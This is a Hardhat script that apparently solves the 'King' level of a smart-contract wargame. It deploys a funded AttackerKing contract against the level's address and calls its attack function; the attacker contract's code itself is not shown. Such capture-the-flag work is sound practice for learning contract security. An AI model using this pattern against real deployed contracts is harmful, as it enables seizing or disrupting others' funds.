const { ethers } = require("hardhat");
const hre = require("hardhat");
async function main() {
    
    //Params
    levelAddress = "0xf009C169A346fac4e5bDD71ED49C7C3d2888e523";
    contractName = "King";

    const account = await hre.ethers.getSigner();
    console.log(`Working with account ${account.address}`);
    const Level = await hre.ethers.getContractFactory(contractName);
    const level = await Level.attach(levelAddress);
    console.log(`Level at address ${levelAddress}`);
    const Attacker = await hre.ethers.getContractFactory(`Attacker${contractName}`);
    const attacker = await Attacker.deploy(levelAddress,{value: hre.ethers.utils.parseEther("0.002")});
    console.log(`Attacker at ${attacker.address}`);

    
    tx = await attacker.attack();
    tr = await tx.wait();
    

    
    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
